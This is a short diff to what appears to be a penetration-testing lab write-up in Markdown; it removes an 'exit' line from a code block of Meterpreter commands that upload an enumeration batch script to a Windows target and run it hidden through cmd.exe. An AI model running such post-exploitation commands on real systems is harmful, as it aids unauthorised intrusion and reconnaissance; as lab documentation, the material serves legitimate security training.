@@ -145,7 +145,6 @@ The script was uploaded to the target via Meterpreter's `upload` command and exe
 upload /home/kali/enum.bat C:\\Users\\Apollo\\Documents\\enum.bat
 execute -f cmd.exe -a "/c C:\\Users\\Apollo\\enum.bat" -i -H
 ls C:\\temp\\
-exit
 ```
  
 <img width="751" height="129" alt="image" src="https://github.com/user-attachments/assets/884f20bd-78fe-4175-b096-fc3ce23e1a2a" />
